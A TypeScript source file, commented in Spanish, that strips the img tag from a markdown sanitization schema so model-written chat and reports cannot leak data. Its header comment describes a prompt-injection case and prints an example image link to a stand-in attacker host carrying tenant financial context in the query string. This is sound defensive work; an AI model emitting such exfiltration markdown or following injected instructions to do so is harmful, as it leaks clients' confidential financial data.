// src/lib/security/markdown-sanitize-schema.ts
// Schema endurecido para rehype-sanitize, compartido por TODOS los renderers de
// markdown de la app.
//
// El motivo: `rehypePlugins={[rehypeSanitize]}` (sin invocar) aplica el schema por
// defecto de hast-util-sanitize, que admite `<img src>` con protocolo http/https.
// Como la CSP deja `img-src ... https:` abierta mientras `connect-src` está acotada
// a un puñado de hosts, la imagen es el único canal de egreso a un host arbitrario:
// una respuesta del modelo contaminada por prompt injection puede terminar con
// `![](https://atacante.tld/p.png?d=<contexto>)` y el navegador del contador la
// pide sola al pintarse, sin un click. Lo que viaja en el query string es el
// contexto financiero del tenant (balance de prueba, NITs de terceros, documento
// del cliente).
//
// El markdown que renderizamos lo escribe SIEMPRE el modelo (chat, reportes,
// diffs), nunca el usuario, y ninguna de esas superficies muestra imágenes: quitar
// `img` del schema es lossless para el producto y cierra el canal.
//
// Se importa `defaultSchema` desde 'rehype-sanitize' —que lo re-exporta— y no desde
// 'hast-util-sanitize', para no depender de un paquete transitivo no declarado en
// package.json.

import { defaultSchema, type Options as SanitizeSchema } from 'rehype-sanitize';

/**
 * Schema por defecto de rehype-sanitize MENOS la etiqueta `img`.
 *
 * Uso obligatorio en todo `<ReactMarkdown>`:
 *   rehypePlugins={[[rehypeSanitize, MARKDOWN_SANITIZE_SCHEMA]]}
 *
 * Ojo con la forma: pasar `[rehypeSanitize]` a secas NO aplica este schema — hay
 * que invocar el plugin con él.
 */
export const MARKDOWN_SANITIZE_SCHEMA: SanitizeSchema = {
  ...defaultSchema,
  tagNames: (defaultSchema.tagNames ?? []).filter((tag) => tag !== 'img'),
  // Defensa en profundidad: aunque `tagNames` ya descarta el elemento, dejamos fuera
  // también su lista de atributos permitidos, para que un futuro re-alta de `img` no
  // reabra `src` por descuido.
  attributes: Object.fromEntries(
    Object.entries(defaultSchema.attributes ?? {}).filter(([tag]) => tag !== 'img'),
  ),
};
